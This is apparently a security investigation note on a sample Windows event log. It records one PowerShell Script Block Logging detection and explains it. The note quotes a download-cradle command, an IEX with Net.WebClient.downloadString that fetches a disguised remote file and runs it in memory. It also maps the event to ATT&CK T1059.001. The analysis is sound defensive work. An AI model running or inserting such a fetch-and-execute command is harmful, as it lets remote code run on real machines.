---
date: 2026-07-14
tags: [investigation, t1059-001]
techniques: [T1059.001]
status: needs-review
---

# PowerShell Payload Download Investigation

## Findings Summary

A scan of `samples/ID4103-4104-Payload-download-via-PowerShell.evtx` at `min_severity: medium` returned a single but high-severity finding. On host `fs03vuln.offsec.lan`, the **Suspicious PowerShell Invocations - Specific** rule (level: high) fired against a PowerShell Script Block Logging event (Event ID 4104, `Microsoft-Windows-PowerShell/Operational`) recorded at 2022-01-24 12:11:11 -08:00.

The captured script block content was:

```
IEX(New-Object Net.WebClient).downloadString('https://miro.medium.com/max/1400/1*FnPDYeZVrGTbuE7Lj7JhgQ.png')
```

This is a classic download-cradle pattern: `Net.WebClient.downloadString` retrieves remote content over HTTPS and pipes it directly into `Invoke-Expression` (`IEX`), executing it in memory without ever touching disk. The remote URL is disguised with a `.png` extension on a legitimate-looking `miro.medium.com` host, which is a common technique to blend malicious payload staging in with benign-looking web traffic and evade extension-based filtering. This maps to [[T1059.001]] (Command and Scripting Interpreter: PowerShell) under the Execution tactic.

Only one event matched at this severity threshold, so there's no broader pattern of repeated invocations in this EVTX sample — this looks like a single-shot proof-of-concept or an isolated stage of a larger attack chain that isn't otherwise represented in this log.

## Detection Coverage

| Technique | Status | Rule |
|---|---|---|
| [[T1059.001]] | Gap | No rule found |

## Scan Parameters

- **EVTX path:** `samples/ID4103-4104-Payload-download-via-PowerShell.evtx`
- **min_severity:** `medium`
- **Results:** 1 returned / 1 total (`count: 1`, `returned: 1`)

## Analyst Notes

